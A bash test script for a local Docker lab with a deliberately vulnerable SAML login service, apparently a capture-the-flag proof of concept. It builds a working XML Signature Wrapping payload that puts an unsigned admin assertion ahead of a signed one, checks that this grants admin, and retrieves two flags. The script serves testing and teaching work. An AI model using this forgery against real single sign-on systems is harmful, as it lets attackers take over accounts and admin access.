#!/usr/bin/env bash
set -e
DC=$(docker compose version &>/dev/null && echo "docker compose" || echo "docker-compose")

$DC down 2>/dev/null || true
$DC up --build -d
sleep 3

PASS=0; FAIL=0

check() {
    local label="$1" result="$2"
    if [ "$result" = "1" ]; then echo "[PASS] $label"; PASS=$((PASS+1))
    else echo "[FAIL] $label"; FAIL=$((FAIL+1)); fi
}

until nc -z -w2 127.0.0.1 8093 2>/dev/null; do sleep 1; done

CJAR=$(mktemp /tmp/cookies-XXXXXX.txt)

# Test 1: legitimate SAML flow with signed alice response
IDP_RESP=$(curl -s http://127.0.0.1:8093/debug/idp 2>/dev/null)
ALICE_BLOB=$(echo "$IDP_RESP" | python3 -c "import json,sys; print(json.load(sys.stdin)['saml_response'])" 2>/dev/null)
check "debug IdP returns signed response" "$( [ -n "$ALICE_BLOB" ] && echo 1 || echo 0 )"

OUT=$(curl -s -c "$CJAR" -b "$CJAR" \
    -X POST http://127.0.0.1:8093/sso/acs \
    -H "Content-Type: application/json" \
    -d "{\"SAMLResponse\":\"$ALICE_BLOB\"}" 2>/dev/null)
check "valid signed response logs in as alice/user" "$( echo "$OUT" | grep -q 'alice' && echo 1 || echo 0 )"

# Test 2: tampered response (modify role to admin without fixing signature) MUST fail
TAMPERED=$(python3 -c "
import base64, re, sys
blob = '$ALICE_BLOB'
xml = base64.b64decode(blob).decode()
xml2 = xml.replace('<saml:AttributeValue>user</saml:AttributeValue>',
                   '<saml:AttributeValue>admin</saml:AttributeValue>')
print(base64.b64encode(xml2.encode()).decode())
")
OUT=$(curl -s \
    -X POST http://127.0.0.1:8093/sso/acs \
    -H "Content-Type: application/json" \
    -d "{\"SAMLResponse\":\"$TAMPERED\"}" 2>/dev/null)
check "directly tampered response fails signature check" "$( echo "$OUT" | grep -q 'failed\|403' && echo 1 || echo 0 )"

# Test 3: XSW attack -- inject unsigned admin assertion BEFORE the signed one
rm -f "$CJAR"; CJAR=$(mktemp /tmp/cookies-XXXXXX.txt)
XSW_BLOB=$(python3 - "$ALICE_BLOB" << 'PYEOF'
import base64, re, sys
alice_b64 = sys.argv[1]
xml = base64.b64decode(alice_b64).decode()
import re
signed_assertion = re.search(r'(<saml:Assertion.*?</saml:Assertion>)', xml, re.DOTALL).group(1)
unsigned_admin = (
    '<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="xsw_inject">'
    '<saml:NameID>attacker</saml:NameID>'
    '<saml:AttributeStatement>'
    '<saml:Attribute Name="role">'
    '<saml:AttributeValue>admin</saml:AttributeValue>'
    '</saml:Attribute>'
    '</saml:AttributeStatement>'
    '</saml:Assertion>'
)
wrapped = (
    '<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">'
    + unsigned_admin
    + signed_assertion
    + '</samlp:Response>'
)
print(base64.b64encode(wrapped.encode()).decode())
PYEOF
)
OUT=$(curl -s -c "$CJAR" -b "$CJAR" \
    -X POST http://127.0.0.1:8093/sso/acs \
    -H "Content-Type: application/json" \
    -d "{\"SAMLResponse\":\"$XSW_BLOB\"}" 2>/dev/null)
check "XSW attack passes signature verification" "$( echo "$OUT" | grep -q 'message\|attacker' && echo 1 || echo 0 )"
check "XSW attack grants admin role" "$( echo "$OUT" | grep -q 'admin' && echo 1 || echo 0 )"

# Test 4: flag1 from /profile
OUT=$(curl -s -c "$CJAR" -b "$CJAR" http://127.0.0.1:8093/profile 2>/dev/null)
FLAG1=$(echo "$OUT" | grep -oE 'POC\{[0-9a-f]{32}\}' | head -1)
check "admin profile returns flag1" "$( [ -n "$FLAG1" ] && echo 1 || echo 0 )"
[ -n "$FLAG1" ] && echo "    flag1=$FLAG1"

# Test 5: flag2 from /admin/secret
OUT=$(curl -s -c "$CJAR" -b "$CJAR" http://127.0.0.1:8093/admin/secret 2>/dev/null)
FLAG2=$(echo "$OUT" | grep -oE 'POC\{[0-9a-f]{32}\}' | head -1)
check "admin/secret returns flag2" "$( [ -n "$FLAG2" ] && echo 1 || echo 0 )"
[ -n "$FLAG2" ] && echo "    flag2=$FLAG2"

rm -f "$CJAR"
$DC down

echo ""
echo "Results: $PASS passed, $FAIL failed"
[ "$FAIL" -eq 0 ]
